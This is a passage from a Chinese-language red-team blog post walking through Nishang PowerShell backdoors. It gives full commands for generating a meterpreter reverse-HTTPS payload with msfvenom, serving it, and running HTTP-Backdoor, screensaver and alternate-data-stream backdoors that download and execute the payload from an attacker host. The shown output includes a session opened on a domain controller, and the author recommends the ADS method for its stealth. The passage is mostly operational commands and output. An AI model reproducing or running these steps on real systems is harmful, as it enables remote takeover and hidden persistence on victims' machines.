</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>172.16.0.107<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>172.16.0.110<span class="o">]</span> <span class="m">51298</span>
</span></span><span class="line"><span class="cl">whoami
</span></span><span class="line"><span class="cl">desktop-win10<span class="se">\w</span>in10
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\w</span>in10<span class="se">\D</span>esktop&gt;
</span></span></code></pre></div><h3 id="后门-1">后门</h3>
<p>我们可以在目录<code>Backdoors</code>下看到各种生成后门的脚本：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="n">Backdoors</span><span class="p">&gt;</span> <span class="nb">ls
</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
</span></span><span class="line"><span class="cl"><span class="p">----</span>                <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>        <span class="mf">2021</span><span class="p">/</span><span class="mf">7</span><span class="p">/</span><span class="mf">23</span>     <span class="mf">22</span><span class="err">:</span><span class="mf">49</span>           <span class="mf">5049</span> <span class="nb">Add-ConstrainedDelegationBackdoor</span><span class="p">.</span><span class="py">ps1</span> <span class="p">//</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>        <span class="mf">2021</span><span class="p">/</span><span class="mf">7</span><span class="p">/</span><span class="mf">23</span>     <span class="mf">22</span><span class="err">:</span><span class="mf">49</span>           <span class="mf">1741</span> <span class="nb">Add-RegBackdoor</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>        <span class="mf">2021</span><span class="p">/</span><span class="mf">7</span><span class="p">/</span><span class="mf">23</span>     <span class="mf">22</span><span class="err">:</span><span class="mf">49</span>           <span class="mf">5077</span> <span class="nb">Add-ScrnSaveBackdoor</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>        <span class="mf">2021</span><span class="p">/</span><span class="mf">7</span><span class="p">/</span><span class="mf">23</span>     <span class="mf">22</span><span class="err">:</span><span class="mf">49</span>          <span class="mf">18593</span> <span class="n">DNS_TXT_Pwnage</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>        <span class="mf">2021</span><span class="p">/</span><span class="mf">7</span><span class="p">/</span><span class="mf">23</span>     <span class="mf">22</span><span class="err">:</span><span class="mf">49</span>          <span class="mf">12739</span> <span class="nb">Execute-OnTime</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>        <span class="mf">2021</span><span class="p">/</span><span class="mf">7</span><span class="p">/</span><span class="mf">23</span>     <span class="mf">22</span><span class="err">:</span><span class="mf">49</span>           <span class="mf">6122</span> <span class="nb">Gupt-Backdoor</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>        <span class="mf">2021</span><span class="p">/</span><span class="mf">7</span><span class="p">/</span><span class="mf">23</span>     <span class="mf">22</span><span class="err">:</span><span class="mf">49</span>          <span class="mf">13572</span> <span class="nb">HTTP-Backdoor</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>        <span class="mf">2021</span><span class="p">/</span><span class="mf">7</span><span class="p">/</span><span class="mf">23</span>     <span class="mf">22</span><span class="err">:</span><span class="mf">49</span>           <span class="mf">4385</span> <span class="nb">Invoke-ADSBackdoor</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>        <span class="mf">2021</span><span class="p">/</span><span class="mf">7</span><span class="p">/</span><span class="mf">23</span>     <span class="mf">22</span><span class="err">:</span><span class="mf">49</span>           <span class="mf">5597</span> <span class="nb">Set-RemotePSRemoting</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>        <span class="mf">2021</span><span class="p">/</span><span class="mf">7</span><span class="p">/</span><span class="mf">23</span>     <span class="mf">22</span><span class="err">:</span><span class="mf">49</span>           <span class="mf">8017</span> <span class="nb">Set-RemoteWMI</span><span class="p">.</span><span class="py">ps1</span>
</span></span></code></pre></div><p>这里演示三个后门，一个是<code>HTTP-Backdoor</code>和<code>Add-ScrnSaveBackdoor</code>、<code>Invoke-ADSBackdoor</code></p>
<p>首先在msf生成一个powershell的后门：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ msfvenom -p windows/x64/meterpreter/reverse_https <span class="nv">LHOST</span><span class="o">=</span>172.16.0.107 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f psh -o test.ps1
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
</span></span><span class="line"><span class="cl">Payload size: <span class="m">746</span> bytes
</span></span><span class="line"><span class="cl">Final size of psh file: <span class="m">4405</span> bytes
</span></span><span class="line"><span class="cl">Saved as: test.ps1
</span></span></code></pre></div><p>在msf里面执行监听：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> payload windows/x64/meterpreter/reverse_https
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">=</span>&gt; windows/x64/meterpreter/reverse_https
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; show options
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>exploit/multi/handler<span class="o">)</span>:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Name  Current Setting  Required  Description
</span></span><span class="line"><span class="cl">   ----  ---------------  --------  -----------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Payload options <span class="o">(</span>windows/x64/meterpreter/reverse_tcp<span class="o">)</span>:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Name      Current Setting  Required  Description
</span></span><span class="line"><span class="cl">   ----      ---------------  --------  -----------
</span></span><span class="line"><span class="cl">   EXITFUNC  process          yes       Exit technique <span class="o">(</span>Accepted: <span class="s1">&#39;&#39;</span>, seh, thread, process, none<span class="o">)</span>
</span></span><span class="line"><span class="cl">   LHOST     172.16.0.107     yes       The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
</span></span><span class="line"><span class="cl">   LPORT     <span class="m">4444</span>             yes       The listen port
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Exploit target:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Id  Name
</span></span><span class="line"><span class="cl">   --  ----
</span></span><span class="line"><span class="cl">   <span class="m">0</span>   Wildcard Target
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; run
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started HTTPS reverse handler on https://172.16.0.107:4444
</span></span></code></pre></div><p>最后在test.ps1目录中运行http服务器：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python -m http.server
</span></span></code></pre></div><p>这样就部署成功基础环境了。</p>
<p>1、HTTP-Backdoor</p>
<p>在目标机器上执行以下命令：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PS C:\Users\test\Desktop\nishang-master\nishang-master\Backdoors&gt; Import-Module .\HTTP-Backdoor.ps1
</span></span><span class="line"><span class="cl">PS C:\Users\test\Desktop\nishang-master\nishang-master\Backdoors&gt; HTTP-Backdoor
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">位于命令管道位置 1 的 cmdlet HTTP-Backdoor
</span></span><span class="line"><span class="cl">请为以下参数提供值:
</span></span><span class="line"><span class="cl">CheckURL: http://172.16.0.107:8000/user.txt
</span></span><span class="line"><span class="cl">PayloadURL: http://172.16.0.107:8000/test.ps1
</span></span><span class="line"><span class="cl">MagicString: start123
</span></span><span class="line"><span class="cl">StopString: stop123
</span></span></code></pre></div><p>意思就是说提供一个checkURL，然后不断检测这个url的内容，如果出现start123那就开始执行远程payloadURL的文件，如果检测到stop123内容就停止执行。</p>
<p>可以看到kali已经反弹回来：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; run
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started HTTPS reverse handler on https://172.16.0.107:4444
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> https://172.16.0.107:4444 handling request from 172.16.0.106<span class="p">;</span> <span class="o">(</span>UUID: e1dpvgub<span class="o">)</span> Without a database connected that payload UUID tracking will not work!
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> https://172.16.0.107:4444 handling request from 172.16.0.106<span class="p">;</span> <span class="o">(</span>UUID: e1dpvgub<span class="o">)</span> Staging x64 payload <span class="o">(</span><span class="m">201308</span> bytes<span class="o">)</span> ...
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> https://172.16.0.107:4444 handling request from 172.16.0.106<span class="p">;</span> <span class="o">(</span>UUID: e1dpvgub<span class="o">)</span> Without a database connected that payload UUID tracking will not work!
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">48</span> opened <span class="o">(</span>172.16.0.107:4444 -&gt; 127.0.0.1 <span class="o">)</span> at 2022-02-08 18:51:29 +0800
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">meterpreter &gt; sysinfo
</span></span><span class="line"><span class="cl">Computer        : DC
</span></span><span class="line"><span class="cl">OS              : Windows 2016+ <span class="o">(</span>10.0 Build 14393<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Architecture    : x64
</span></span><span class="line"><span class="cl">System Language : zh_CN
</span></span><span class="line"><span class="cl">Domain          : HACK
</span></span><span class="line"><span class="cl">Logged On Users : <span class="m">7</span>
</span></span><span class="line"><span class="cl">Meterpreter     : x64/windows
</span></span></code></pre></div><p>2、Add-ScrnSaveBackdoor</p>
<p>这个是需要system权限才可执行：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="n">Backdoors</span><span class="p">&gt;</span> <span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Add-ScrnSaveBackdoor</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="n">Backdoors</span><span class="p">&gt;</span> <span class="nb">Add-ScrnSaveBackdoor</span> <span class="n">-PayloadURL</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">172.16</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="mf">107</span><span class="err">:</span><span class="mf">8000</span><span class="p">/</span><span class="n">test</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="n">Payload</span> <span class="n">added</span> <span class="n">as</span> <span class="n">Debugger</span> <span class="k">for</span> <span class="n">ssText3d</span><span class="p">.</span><span class="py">scr</span>
</span></span></code></pre></div><p>然后等屏幕保护执行就会弹回一个shell，这个测试总是会不断弹窗。</p>
<p>上面两个后门都是不太稳定的。。。</p>
<p>3、Invoke-ADSBackdoor</p>
<p>这个后门还是比较稳的：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="n">Backdoors</span><span class="p">&gt;</span> <span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Invoke-ADSBackdoor</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="n">Backdoors</span><span class="p">&gt;</span> <span class="nb">Invoke-ADSBackdoor</span> <span class="n">-PayloadURL</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">172.16</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="mf">107</span><span class="err">:</span><span class="mf">800</span>
</span></span><span class="line"><span class="cl"><span class="mf">0</span><span class="p">/</span><span class="n">test</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Update</span>       <span class="err">:</span> <span class="n">wscript</span><span class="p">.</span><span class="py">exe</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">AppData</span><span class="err">:</span><span class="n">weu5hw1bnb0</span><span class="p">.</span><span class="py">vbs</span>
</span></span><span class="line"><span class="cl"><span class="n">PSPath</span>       <span class="err">:</span> <span class="n">Microsoft</span><span class="p">.</span><span class="py">PowerShell</span><span class="p">.</span><span class="n">Core</span><span class="p">\</span><span class="n">Registry</span><span class="p">::</span><span class="n">HKEY_CURRENT_USER</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">CurrentVersion</span><span class="p">\</span><span class="n">Run</span>
</span></span><span class="line"><span class="cl"><span class="n">PSParentPath</span> <span class="err">:</span> <span class="n">Microsoft</span><span class="p">.</span><span class="py">PowerShell</span><span class="p">.</span><span class="n">Core</span><span class="p">\</span><span class="n">Registry</span><span class="p">::</span><span class="n">HKEY_CURRENT_USER</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">CurrentVersion</span>
</span></span><span class="line"><span class="cl"><span class="n">PSChildName</span>  <span class="err">:</span> <span class="n">Run</span>
</span></span><span class="line"><span class="cl"><span class="n">PSDrive</span>      <span class="err">:</span> <span class="n">HKCU</span>
</span></span><span class="line"><span class="cl"><span class="n">PSProvider</span>   <span class="err">:</span> <span class="n">Microsoft</span><span class="p">.</span><span class="py">PowerShell</span><span class="p">.</span><span class="n">Core</span><span class="p">\</span><span class="n">Registry</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">Process</span> <span class="n">Complete</span><span class="p">.</span> <span class="n">Persistent</span> <span class="n">key</span> <span class="n">is</span> <span class="n">located</span> <span class="n">at</span> <span class="n">HKCU</span><span class="err">:</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">CurrentVersion</span><span class="p">\</span><span class="n">Run</span><span class="p">\</span><span class="n">Update</span>
</span></span></code></pre></div><p>执行后会在启动项上面添加一个隐藏文件：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\Users\test&gt;dir /a /r
</span></span><span class="line"><span class="cl"> 驱动器 C 中的卷没有标签。
</span></span><span class="line"><span class="cl"> 卷的序列号是 B2FD-2FAE
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> C:\Users\test 的目录
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">2022/01/23  12:50    &lt;DIR&gt;          .
</span></span><span class="line"><span class="cl">2022/01/23  12:50    &lt;DIR&gt;          ..
</span></span><span class="line"><span class="cl">2022/02/08  19:12    &lt;DIR&gt;          AppData
</span></span><span class="line"><span class="cl">                                274 AppData:5obuog3ec1g.txt:$DATA
</span></span><span class="line"><span class="cl">                                274 AppData:agdqfvr2ozv.txt:$DATA
</span></span><span class="line"><span class="cl">                                206 AppData:eomzmbrpnjv.vbs:$DATA
</span></span><span class="line"><span class="cl">                                206 AppData:weu5hw1bnb0.vbs:$DATA
</span></span></code></pre></div><p>隐秘性很高，推荐这种后门方式。</p>


            <hr class="bg-gray-300 mt-8">

            

            
<div class="border-l-4 border-red-400 mx-auto text-gray-500">
    <div class="copyright">
        <ul class="list-none">
            <li>
                <strong>原文作者：</strong>
                <a rel="author" href="https://xxe.icu">F0rmat</a>
            </li>
            <li style="word-break:break-all">
                <strong>原文链接：</strong>
                <a href="https://xxe.icu/powershell-attack.html">https://xxe.icu/powershell-attack.html</a>
            </li>
            <li>
                <strong>版权声明：</strong>本作品采用
                <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh">署名 - 非商业性使用 4.0 国际 (CC BY-NC 4.0)</a>进行许可，非商业转载请注明出处（作者，原文链接），商业转载请联系作者获得授权。
            </li>
        </ul>
    </div>
 
</div>


        </div>

        
        

         
        

    </div>
    

    
    <hr class="bg-gray-300 dark:bg-gray-300 my-10">

    
        
        
        <div class="comments">
            

  

  
    <script src="https://utteranc.es/client.js"
            repo="Secd0g/comment"
            issue-term="pathname"
            theme="github-light"
            crossorigin="anonymous"
            async>
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>

  
        </div>

        <div class="related my-5">
            


<div class="p-8 mt-6 lg:mt-0 rounded shadow bg-white dark:bg-gray-800">
    <h2 class="font-sans font-bold break-normal text-gray-700 px-2 pb-3 text-xl dark:text-gray-300">相关文章</h2>
    
    <li><a href="/apparmor_bypass.html" class="underline text-yellow-600">Apparmor的绕过</a></li>
    
    <li><a href="/linux_capabilities_2.html" class="underline text-yellow-600">Linux Capabilities 入门教程：进阶实战篇</a></li>
    
    <li><a href="/linux_capabilities_1.html" class="underline text-yellow-600">Linux Capabilities 入门教程：基础实战篇</a></li>
    
    <li><a href="/linux_capabilities_0.html" class="underline text-yellow-600">Linux Capabilities 入门教程：概念篇</a></li>
    
    <li><a href="/hugo_theme_record.html" class="underline text-yellow-600">Hyde-Hugo主题修改记录(搜索、分页、TOC、归档)</a></li>
    
</div>

        </div>

    

</section>


<div class="hidden xl:text-sm xl:block xl:w-1/4 xl:px-6 ">

    <div class="lg:w-full mx-auto items-center justify-between">
    <div class="bg-white shadow rounded overflow-hidden dark:bg-gray-800">
        <div class="bg-cover mx-auto w-32 h-32 mt-5 rounded-full" style="background-image: url('https://avatars.githubusercontent.com/u/16066632?v=4')"> </div>
        
        <div class="p-4">
            <p class="text-2xl text-center pb-2">F0rmat</p>
            <p class="text-sm text-center text-gray-700 dark:text-gray-300">专注于信息安全、内网渗透、红队攻防</p>
        </div>
        <div class="flex p-4 border-t text-sm border-gray-300 text-gray-700 dark:text-gray-300">
            <div class="flex-1 border-r border-gray-600">
                <p class="text-center">
                    <span class="font-bold ">
                        92
                    </span>
                    文章
                </p>
            </div>
            <div class="flex-1 text-center">
                <p class="text-center">
                    <span class="font-bold">
                        
                            60
                        
                    </span>
                    标签
                </p>
            </div>
        </div>
        <div class="px-4 pb-4 border-t border-gray-300 dark:text-gray-200">
            <div class="mt-6 pb-16 lg:pb-0 w-4/5 lg:w-full mx-auto flex flex-wrap items-center  text-gray-500">
                
                <a href="//github.com/Secd0g" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="GitHub"><i class="my-iconfont icon-social-github"></i></a>
                

                

                

                

                

                

                

                

                

                

                

                

                

                

                

                

                
                
                <a href="//zhihu.com/people/F0rmat" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="zhihu"><i><svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 640 512"><style>svg{fill:#bac5d8}</style><path d="M170.54 148.13v217.54l23.43.01 7.71 26.37 42.01-26.37h49.53V148.13H170.54zm97.75 193.93h-27.94l-27.9 17.51-5.08-17.47-11.9-.04V171.75h72.82v170.31zm-118.46-94.39H97.5c1.74-27.1 2.2-51.59 2.2-73.46h51.16s1.97-22.56-8.58-22.31h-88.5c3.49-13.12 7.87-26.66 13.12-40.67 0 0-24.07 0-32.27 21.57-3.39 8.9-13.21 43.14-30.7 78.12 5.89-.64 25.37-1.18 36.84-22.21 2.11-5.89 2.51-6.66 5.14-14.53h28.87c0 10.5-1.2 66.88-1.68 73.44H20.83c-11.74 0-15.56 23.62-15.56 23.62h65.58C66.45 321.1 42.83 363.12 0 396.34c20.49 5.85 40.91-.93 51-9.9 0 0 22.98-20.9 35.59-69.25l53.96 64.94s7.91-26.89-1.24-39.99c-7.58-8.92-28.06-33.06-36.79-41.81L87.9 311.95c4.36-13.98 6.99-27.55 7.87-40.67h61.65s-.09-23.62-7.59-23.62v.01zm412.02-1.6c20.83-25.64 44.98-58.57 44.98-58.57s-18.65-14.8-27.38-4.06c-6 8.15-36.83 48.2-36.83 48.2l19.23 14.43zm-150.09-59.09c-9.01-8.25-25.91 2.13-25.91 2.13s39.52 55.04 41.12 57.45l19.46-13.73s-25.67-37.61-34.66-45.86h-.01zM640 258.35c-19.78 0-130.91.93-131.06.93v-101c4.81 0 12.42-.4 22.85-1.2 40.88-2.41 70.13-4 87.77-4.81 0 0 12.22-27.19-.59-33.44-3.07-1.18-23.17 4.58-23.17 4.58s-165.22 16.49-232.36 18.05c1.6 8.82 7.62 17.08 15.78 19.55 13.31 3.48 22.69 1.7 49.15.89 24.83-1.6 43.68-2.43 56.51-2.43v99.81H351.41s2.82 22.31 25.51 22.85h107.94v70.92c0 13.97-11.19 21.99-24.48 21.12-14.08.11-26.08-1.15-41.69-1.81 1.99 3.97 6.33 14.39 19.31 21.84 9.88 4.81 16.17 6.57 26.02 6.57 29.56 0 45.67-17.28 44.89-45.31v-73.32h122.36c9.68 0 8.7-23.78 8.7-23.78l.03-.01z"/></svg></i></a>
                

                

                

                

                

                

                
                <a href="/atom.xml" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="RSS"><i class="my-iconfont icon-feed"></i></a>
                
            </div>
        </div>
    </div>
</div>










    <div class="flex flex-col justify-between sticky top-0 pt-12 pb-4 -mt-10 text-gray-600 dark:text-gray-400">
        <div class="bg-white shadow rounded p-4 mt-5 dark:bg-gray-800">
            
<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
    <div class="sticky text-sm" style="top:6em;" id="menu-content">
        <nav id="TableOfContents">
  <ul>
    <li><a href="#简介">简介</a></li>
    <li><a href="#powershell基础">PowerShell基础</a>
      <ul>
        <li><a href="#powershell简介">PowerShell简介</a></li>
        <li><a href="#powershell的常用命令">PowerShell的常用命令</a>
          <ul>
            <li><a href="#powershell与其他命令解释器的比较">PowerShell与其他命令解释器的比较</a></li>
          </ul>
        </li>
        <li><a href="#powershell的执行策略">Powershell的执行策略</a>
          <ul>
            <li><a href="#绕执行策略">绕执行策略</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#powersploit">PowerSploit</a>
      <ul>
        <li><a href="#安装">安装</a></li>
        <li><a href="#攻击实战">攻击实战</a>
          <ul>
            <li><a href="#invoke-shellcode">Invoke-Shellcode</a></li>
            <li><a href="#invoke-dllinjection">Invoke-DllInjection</a></li>
            <li><a href="#invoke-portscan">Invoke-Portscan</a></li>
            <li><a href="#invoke-mimikatz">Invoke-Mimikatz</a></li>
            <li><a href="#get-keystrokes">Get-Keystrokes</a></li>
            <li><a href="#powerup攻击模块实战1">PowerUp攻击模块实战1</a></li>
            <li><a href="#powerup攻击模块实战2">PowerUp攻击模块实战2</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#empire">Empire</a>
      <ul>
        <li><a href="#安装-1">安装</a></li>
        <li><a href="#监听上线">监听上线</a></li>
        <li><a href="#连接主机及信息收集">连接主机及信息收集</a>
          <ul>
            <li><a href="#屏幕截图">屏幕截图</a></li>
            <li><a href="#键盘记录">键盘记录</a></li>
            <li><a href="#剪切板记录">剪切板记录</a></li>
            <li><a href="#查找共享">查找共享</a></li>
            <li><a href="#收集目标主机信息">收集目标主机信息</a></li>
            <li><a href="#arp扫描">ARP扫描</a></li>
            <li><a href="#dns信息获取">DNS信息获取</a></li>
            <li><a href="#获取域控制器">获取域控制器</a></li>
          </ul>
        </li>
        <li><a href="#权限提升">权限提升</a>
          <ul>
            <li><a href="#bypass-uac">Bypass UAC</a></li>
            <li><a href="#bypassuac_wscript">bypassuac_wscript</a></li>
            <li><a href="#powerup">PowerUP</a></li>
            <li><a href="#gpp">GPP</a></li>
          </ul>
        </li>
        <li><a href="#横向渗透">横向渗透</a>
          <ul>
            <li><a href="#令牌窃取">令牌窃取</a></li>
            <li><a href="#会话注入">会话注入</a></li>
            <li><a href="#invoke-psexec">Invoke-PsExec</a></li>
            <li><a href="#invoke-wmi">Invoke-WMI</a></li>
            <li><a href="#powershell-remoting">Powershell Remoting</a></li>
          </ul>
        </li>
        <li><a href="#后门">后门</a>
          <ul>
            <li><a href="#劫持shift后门">劫持Shift后门</a></li>
            <li><a href="#注册表注入后门">注册表注入后门</a></li>
            <li><a href="#计划任务">计划任务</a></li>
            <li><a href="#与metasploit联动">与Metasploit联动</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#nishang">Nishang</a>
      <ul>
        <li><a href="#安装-2">安装</a></li>
        <li><a href="#nishang模块攻击实战">Nishang模块攻击实战</a>
          <ul>
            <li><a href="#check-vm">Check-VM</a></li>
            <li><a href="#invoke-credentialsphish">Invoke-CredentialsPhish</a></li>
            <li><a href="#copy-vss">Copy-VSS</a></li>
            <li><a href="#firebuster-firelistener扫描器">FireBuster FireListener扫描器</a></li>
            <li><a href="#keylogger键盘记录">Keylogger键盘记录</a></li>
            <li><a href="#invoke-mimikatz-1">Invoke-Mimikatz</a></li>
            <li><a href="#get-passhashes">Get-PassHashes</a></li>
            <li><a href="#get-passhints">Get-PassHints</a></li>
          </ul>
        </li>
        <li><a href="#隐藏通信隧道">隐藏通信隧道</a>
          <ul>
            <li><a href="#基于tcp协议的交互式shell">基于TCP协议的交互式shell</a></li>
            <li><a href="#基于udp协议的交互式shell">基于UDP协议的交互式shell</a></li>
            <li><a href="#基于http和https协议的交互式shell">基于HTTP和HTTPS协议的交互式shell</a></li>
            <li><a href="#webshell后门">Webshell后门</a></li>
          </ul>
        </li>
        <li><a href="#权限提升-1">权限提升</a>
          <ul>
            <li><a href="#下载执行">下载执行</a></li>
            <li><a href="#bypass-uac-1">Bypass UAC</a></li>
            <li><a href="#删除补丁">删除补丁</a></li>
          </ul>
        </li>
        <li><a href="#其他功能">其他功能</a>
          <ul>
            <li><a href="#端口扫描">端口扫描</a></li>
            <li><a href="#弱口令爆破">弱口令爆破</a></li>
            <li><a href="#嗅探待完善">嗅探（待完善）</a></li>
            <li><a href="#屏幕窃取">屏幕窃取</a></li>
            <li><a href="#生成木马">生成木马</a></li>
            <li><a href="#后门-1">后门</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav>
    </div>

        </div>
    </div>
   
</div> 

    </div>
    
    
<footer class="bg-white dark:bg-gray-800 border-gray-400 shadow mt-10">	
    <div class="container  mx-auto flex py-8">
        <div class="w-full text-center text-gray-600 dark:text-gray-400">
            <p>
                &copy; 2023 <a  class="text-gray-700 dark:text-gray-300 font-semibold" href="https://xxe.icu">F0rmat&#39;s Blog</a> By F0rmat 
            </p>
            
            <p class="pt-1">
                Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io/"  class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Hugo</a> 
                Theme based on <a href="https://github.com/forecho/hugo-theme-echo" class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Echo</a>
            </p>

            

        </div>

    </div>
    
   
    
<script src="/js/clipboard.min.js"></script>
   

</footer>

 <script>
  window.onload = function() {
    document.getElementById("nav-toggle").onclick = function() {
